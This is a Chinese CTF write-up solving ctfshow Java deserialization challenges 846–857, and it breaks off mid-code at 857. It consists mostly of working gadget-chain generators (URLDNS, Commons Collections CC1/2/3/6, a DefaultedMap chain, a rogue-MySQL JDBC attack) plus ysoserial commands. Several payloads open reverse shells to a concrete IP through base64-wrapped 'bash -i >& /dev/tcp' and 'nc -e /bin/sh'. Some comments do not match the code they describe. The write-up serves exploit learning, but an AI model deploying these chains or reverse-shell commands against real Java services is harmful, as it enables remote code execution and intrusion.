
# 846
打一个自己地址的dns，urldns链。
```java
package Enterprise.cc;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.lang.reflect.*;

public class urldnls {

    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("evil.bin"));
        oos.writeObject(obj);
    }
    public static String encryptToBase64(String filePath) {
        if (filePath == null) {
            return null;
        }
        try {
            byte[] b = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(b);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    public static void main(String[] args)throws Exception{

        HashMap<URL,Integer> map = new HashMap<URL,Integer>();

        URL url = new URL("http://b55d5a15-684c-496d-aab5-4490b2892e84.challenge.ctf.show/");
        Class c = url.getClass();

        Field hashCodeField = c.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url,1234);
        map.put(url,1);
        hashCodeField.set(url,-1);
        serialize(map);
        String s = encryptToBase64("evil.bin");
        System.out.println(s);

    }
}

```
将序列化文件写成base64流
```java
try {
            byte[] b = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(b);
        } catch (IOException e) {
            e.printStackTrace();
        }
```

# 847
打一个cc链，1，3，6，7都行。
这里贴个poc，应该是链6
```java
package Enterprise.cc;


import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

//import javax.xml.transform.Transformer;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class web847 {
    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("evil.bin"));
        oos.writeObject(obj);
    }
    public static String encryptToBase64(String filePath) {
        if (filePath == null) {
            return null;
        }
        try {
            byte[] b = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(b);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }
    /*
    * Class c = Runtime.class();
    * Method a = c.getMethod("getruntime",null);
    * Runtime s = a.invoke();
    * s.exec()
    *
    * */
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==}|{base64,-d}|{bash,-i}"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"feng1");
        Map hashMap = new HashMap();

        hashMap.put(tiedMapEntry,"feng2");
        outerMap.remove("feng1");
        Class c = LazyMap.class;
        Field factoryfield = c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        factoryfield.set(outerMap,chainedTransformer);

        serialize(hashMap);
        String output = encryptToBase64("evil.bin");
        try {
            FileWriter writer = new FileWriter("output.txt"); // 创建文件写入对象
            writer.write(output); // 写入内容
            writer.close(); // 关闭文件写入对象
            System.out.println("结果已成功写入文件。");
        } catch (IOException e) {
            System.out.println("写入文件时发生错误：" + e.getMessage());
        }

    }
}

```
这里弹shell命令，为了防止特殊字符破坏代码，就用base64过度一下，
```java
FileWriter writer = new FileWriter("output.txt"); // 创建文件写入对象
            writer.write(output); // 写入内容
            writer.close(); // 关闭文件写入对象
            System.out.println("结果已成功写入文件。");
```
出于方便，我把最终payload流写到文件，好复制，毕竟输出太长了。

再贴个师傅的：
```java
package Enterprise.cc;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class boogipop {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{" bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==}|{base64,-d}|{bash,-i}"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","aaa");
        Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationconstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationconstructor.setAccessible(true);
        Object o =  annotationconstructor.newInstance(Target.class, transformedmap);

        serialize(o);
        String res=encryptToBase64("ser.bin");
        try {
            FileWriter writer = new FileWriter("output1.txt"); // 创建文件写入对象
            writer.write(res); // 写入内容
            writer.close(); // 关闭文件写入对象
            System.out.println("结果已成功写入文件。");
        } catch (IOException e) {
            System.out.println("写入文件时发生错误：" + e.getMessage());
        }



    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
        Object obj=ois.readObject();
        return obj;
    }
    public static String encryptToBase64(String filePath) {
        if (filePath == null) {
            return null;
        }
        try {
            byte[] b = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(b);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }

}

```
# 848
不让用transformedmap，直接用上一问的payload就行
贴一个师傅的poc
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDAuMjUxLjE2OS83MDAwIDA+JjE=}|{base64,-d}|{bash,-i}"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationconstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationconstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) annotationconstructor.newInstance(Override.class, lazymap);
        //生成动态代理
        Map mapproxy= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);
        //生成最外层
        Object o = annotationconstructor.newInstance(Override.class, mapproxy);

        serialize(o);
        String res=encryptToBase64("ser.bin");
        System.out.println(res);


    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
        Object obj=ois.readObject();
        return obj;
    }
    public static String encryptToBase64(String filePath) {
        if (filePath == null) {
            return null;
        }
        try {
            byte[] b = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(b);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }
}
```
# 849
为了优化payload生成过程，直接将一些要用到的函数写入一个类里。
```java
package org.example;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class serialize_func {
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
        Object obj=ois.readObject();
        return obj;
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static void writetofile(String output){
        try {
            FileWriter writer = new FileWriter("output.txt"); // 创建文件写入对象
            writer.write(output); // 写入内容
            writer.close(); // 关闭文件写入对象
            System.out.println("结果已成功写入文件。");
        } catch (IOException e) {
            System.out.println("写入文件时发生错误：" + e.getMessage());
        }
    }
    public static String encryptToBase64(String filePath) {
        if (filePath == null) {
            return null;
        }
        try {
            byte[] b = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(b);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }
}

```
这样子新建一个文件直接调用就行。
回到正题，打一个cc2的链。
```java
package Enterprise.cc;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.example.serialize_func;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cc2Test {
    public static void main(String[] args) throws Exception {
        //构造恶意类TestTemplatesImpl并转换为字节码
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("Enterprise.cc.TestTemplatesImpl");
        byte[] bytes = ctClass.toBytecode();

        //反射创建TemplatesImpl
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{});
        Object TemplatesImpl_instance = constructor.newInstance();
        //将恶意类的字节码设置给_bytecodes属性
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(TemplatesImpl_instance, new byte[][]{bytes});
        //设置属性_name为恶意类名
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(TemplatesImpl_instance, "TestTemplatesImpl");

        //构造利用链
        InvokerTransformer transformer = new InvokerTransformer("newTransformer", null, null);
        TransformingComparator transformer_comparator = new TransformingComparator(transformer);
        //触发漏洞
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        //设置comparator属性
        Field field = queue.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, transformer_comparator);

        //设置queue属性
        field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        //队列至少需要2个元素
        Object[] objects = new Object[]{TemplatesImpl_instance, TemplatesImpl_instance};
        field.set(queue, objects);

         serialize_func.serialize(queue);
         //serialize_func.unserialize("ser.bin");
         String s = serialize_func.encryptToBase64("ser.bin");
         serialize_func.writetofile(s);



    }}

```
有一个加载我们恶意类的方法：
```java
ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("Enterprise.cc.TestTemplatesImpl");
        byte[] bytes = ctClass.toBytecode();
```
加载个类池先，然后恶意类直接在项目里面改就行了，不用编译成class文件。
```java
package Enterprise.cc;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TestTemplatesImpl extends AbstractTranslet {

    public TestTemplatesImpl() {
        super();
        try {
            Runtime.getRuntime().exec("nc 43.143.192.19 1145 -e /bin/sh");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```
继承一个抽象类，实现各种方法，不多说了。
priority里面传入TransformingComparator实现其compare方法，然后调用invoketransformer的transform方法，然后调用newtranform方法加载恶意类。
另一个师傅的poc
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

import java.util.PriorityQueue;


public class CC2 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates=new TemplatesImpl();
        Class c= TemplatesImpl.class;
        Field name = c.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"Boogipop");
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("E:\\\\CTF学习笔记\\\\Java\\\\CC1-NEW\\\\target\\\\classes\\\\EXEC.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);
//        由于还没进行反序列化，所以手动给_tfactory赋值
//        Field tfactory = c.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates,new TransformerFactoryImpl());
//
        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);
        Class tc=transformingComparator.getClass();
        Field comparator = tc.getDeclaredField("transformer");
        comparator.setAccessible(true);
        comparator.set(transformingComparator,invokerTransformer);
        serialize(priorityQueue);
        String res=encryptToBase64("ser.bin");
        System.out.println(res);
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
        Object obj=ois.readObject();
        return obj;
    }
    public static String encryptToBase64(String filePath) {
        if (filePath == null) {
            return null;
        }
        try {
            byte[] b = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(b);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }
}
```


# 850
当回脚本小子吧，累了，
java -jar ysoserial.jar CommonsCollections3  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==}|{base64,-d}|{bash,-i}"|base64 
# 851
贴上链子吧
```java
package Enterprise.cc;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.map.DefaultedMap;
import org.example.serialize_func;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class web851 {
    public static void main(String[] args) throws Exception{
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"nc 43.143.192.19 1145 -e /bin/sh"})
        };
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Class<DefaultedMap> d = DefaultedMap.class;
        Constructor<DefaultedMap> defaultedMapConstructor = d.getDeclaredConstructor(Map.class,Transformer.class);
        defaultedMapConstructor.setAccessible(true);
        DefaultedMap defaultedMap1 = defaultedMapConstructor.newInstance(innerMap1, transformerChain);
        DefaultedMap defaultedMap2 = defaultedMapConstructor.newInstance(innerMap2, transformerChain);
        defaultedMap1.put("yy",1);
        defaultedMap2.put("zZ",1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(defaultedMap1, 1);
        hashtable.put(defaultedMap2, 2);
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        defaultedMap2.remove("yy");
        serialize_func.serialize(hashtable);
        serialize_func.writetofile(serialize_func.encryptToBase64("ser.bin"));
    }
}

```
简要说一下这条链子，
通过hashtable:readobject
```c
private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the threshold and loadFactor
        s.defaultReadObject();

        // Validate loadFactor (ignore threshold - it will be re-computed)
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new StreamCorruptedException("Illegal Load: " + loadFactor);

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Validate # of elements
        if (elements < 0)
            throw new StreamCorruptedException("Illegal # of Elements: " + elements);

        // Clamp original length to be more than elements / loadFactor
        // (this is the invariant enforced with auto-growth)
        origlength = Math.max(origlength, (int)(elements / loadFactor) + 1);

        // Compute new length with a bit of room 5% + 3 to grow but
        // no larger than the clamped original length.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)((elements + elements / 20) / loadFactor) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        length = Math.min(length, origlength);
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // sync is eliminated for performance
            reconstitutionPut(table, key, value);
        }
    }
```
跟进reconstitutionPut
```c
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```
e比例了map中的元素，由前面put决定，因此key设置为defaultmap，调用其equals方法，其本身没有，向上调用父类的该方法。
跟进AbstractMapDecorator的equals
```c
public boolean equals(Object object) {
        return object == this ? true : this.decorated().equals(object);
    }
```
decorated()返回hashmap，由于hashmap中没有equals，那么调用父类的equals。
abstractmap的equals方法
```c
public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true;
    }
```
value不为空，进入get，所以前面要给value用put赋上值。
进入到defaultedmap的get
```c
public V get(Object key) {
        return !this.map.containsKey(key) ? this.value.transform(key) : this.map.get(key);
    }
}
```
map为hashmap，由于我们并没有给其用put赋值，那么就会调用value的transform方法。
之后就是chaindtransformer方法，
```c
public T transform(T object) {
        Transformer[] arr$ = this.iTransformers;
        int len$ = arr$.length;

        for(int i$ = 0; i$ < len$; ++i$) {
            Transformer<? super T, ? extends T> iTransformer = arr$[i$];
            object = iTransformer.transform(object);
        }

        return object;
    }
```
控制iTransformer方法，让其为tranformers，形成一个调用链。
```c
Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"nc 43.143.192.19 1145 -e /bin/sh"})
        };
```
以下代码链式执行，之前分析过，不多说了。

# web854
```c
package Enterprise.cc;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.map.DefaultedMap;
import org.example.serialize_func;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class web854 {
    public static void main(String[] args) throws Exception {
        // Reusing transformer chain and LazyMap gadgets from previous payloads
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"nc 43.143.192.19 1145 -e /bin/sh"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap1 = new HashMap();
        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        HashMap<Object,Object> map=new HashMap<>();
        Class<DefaultedMap> d = DefaultedMap.class;
        Constructor<DefaultedMap> declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);
        declaredConstructor.setAccessible(true);
        DefaultedMap defaultedMap = declaredConstructor.newInstance(innerMap1, transformerChain);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(defaultedMap, "aaa");
        HashMap<Object, Object> hashMap=new HashMap<>();
        hashMap.put(tiedMapEntry,"bbb");
        map.remove("aaa");

        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        serialize_func.serialize(hashMap);
        serialize_func.writetofile(serialize_func.encryptToBase64("ser.bin"));

    }

    }


```

readobject,
```c
putVal(hash(key), key, value, false, false);
```
对应的key为tiedmap，
payload里面：
```c
hashMap.put(tiedMapEntry, "bbb");
```
tiedmap hashcode：
```c
public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }

```
getvalue
```c
public V getValue() {
        return this.map.get(this.key);
    }
```
调用defaultedmap的get方法
对应payload
```c
TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, "aaa");
```
defaultmap的get：
```c
public V get(Object key) {
        return !this.map.containsKey(key) ? this.value.transform(key) : this.map.get(key);
    }
}
```
value定义为chaindetransformer，
对应
```c
DefaultedMap defaultedMap = (DefaultedMap)declaredConstructor.newInstance(innerMap1, transformerChain);
```
transformer方法
```c
public T transform(T object) {
        Transformer[] arr$ = this.iTransformers;
        int len$ = arr$.length;

        for(int i$ = 0; i$ < len$; ++i$) {
            Transformer<? super T, ? extends T> iTransformer = arr$[i$];
            object = iTransformer.transform(object);
        }

        return object;
    }
```
iTransformer字段为
```c
Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
```
对应
```c

Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
```
首先创建实例，再通过反射改变。防止提前触发。





# 856
打一个jdbc的反序列化
## 源码鉴赏
```c
package org.example;

import java.io.*;

public class User implements Serializable {
    private static final long serialVersionUID = -7205095498817563965L;
    private String username;
    private String password;

    public User(String username, String password) {
        this.username = username;
        this.password = password;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }


    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof User)) return false;
        User user = (User) o;
        return this.hashCode() == user.hashCode();
    }

    @Override
    public int hashCode() {
        return username.hashCode()+password.hashCode();
    }
}

```
```c
package org.example;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Objects;

public class Connection implements Serializable {

    private static final long serialVersionUID = 2807147458202078901L;

    private String driver;

    private String schema;
    private String host;
    private int port;
    private User user;
    private String database;

    public String getDriver() {
        return driver;
    }

    public void setDriver(String driver) {
        this.driver = driver;
    }

    public String getSchema() {
        return schema;
    }

    public void setSchema(String schema) {
        this.schema = schema;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public String getHost() {
        return host;
    }

    public void setHost(String host) {
        this.host = host;
    }


    public User getUser() {
        return user;
    }

    public void setUser(User user) {
        this.user = user;
    }

    public String getDatabase() {
        return database;
    }

    public void setDatabase(String database) {
        this.database = database;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException {
        Class.forName("com.mysql.jdbc.Driver");
        ObjectInputStream.GetField gf = in.readFields();
        String host = (String) gf.get("host", "127.0.0.1");
        int port = (int) gf.get("port",3306);
        User user = (User) gf.get("user",new User("root","root"));
        String database = (String) gf.get("database", "ctfshow");
        String schema = (String) gf.get("schema", "jdbc:mysql");
        DriverManager.getConnection( schema+"://"+host+":"+port+"/?"+database+"&user="+user.getUsername());
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof Connection)) return false;
        Connection that = (Connection) o;
        return Objects.equals(host, that.host) && Objects.equals(port, that.port) && Objects.equals(user, that.user) && Objects.equals(database, that.database);
    }

    @Override
    public int hashCode() {
        return Objects.hash(host, port, user, database);
    }
}

```
很明显，反序列化的入口在connection类里面，然后要构造一个请求，使得该请求访问的是我们恶意mysql。
```c
package com.ctfshow.entity;







import org.example.serialize_func;
import java.lang.reflect.Field;

public class Main {
    public static void main(String[] args) throws Exception{
        Connection connection = new Connection();
        Class<? extends Connection> refconnection = connection.getClass();
        Field hostfield = refconnection.getDeclaredField("host");
        hostfield.setAccessible(true);
        hostfield.set(connection,"43.143.192.19");
        Field portfield = refconnection.getDeclaredField("port");
        portfield.setAccessible(true);
        portfield.set(connection,3307);
        Field user = refconnection.getDeclaredField("user");
        user.setAccessible(true);
        user.set(connection,new User("enterprise","123456"));
        Field schemafield= refconnection.getDeclaredField("schema");
        schemafield.setAccessible(true);
        schemafield.set(connection,"jdbc:mysql");
        Field database = refconnection.getDeclaredField("database");
        database.setAccessible(true);
        database.set(connection,"detectCustomCollations=true&autoDeserialize=true");
        serialize_func.serialize(connection);
        //serialize_func.unserialize("ser.bin");
        serialize_func.writetofile(serialize_func.encryptToBase64("ser.bin"));
    }
}
```
在config.json里面设置如下：
```c
 "yso":{
        "enterprise":["CommonsCollections4","nc 43.143.192.19 1145 -e /bin/sh"]
    }
}
```
enterprise就是我们要在User类里面设置的username。
## 坑点
一是包要和题目对应，序列化的时候会自动把带上包名，如果反序列化的时候包名不一致，就会报错，所以建议新建一个和题目一模一样的包。
还有就是vps搭建mysql时候，需要在防火墙里面设置对应端口开放，不然无法访问。




# 857
[https://forum.butian.net/share/1339](https://forum.butian.net/share/1339)
打一个postgresql，
```java
package com.ctfshow.entity;
import org.example.serialize_func;
import java.lang.reflect.Field;

public class Main {
    public static void main(String[] args) throws Exception{
        Connection connection = new Connection();
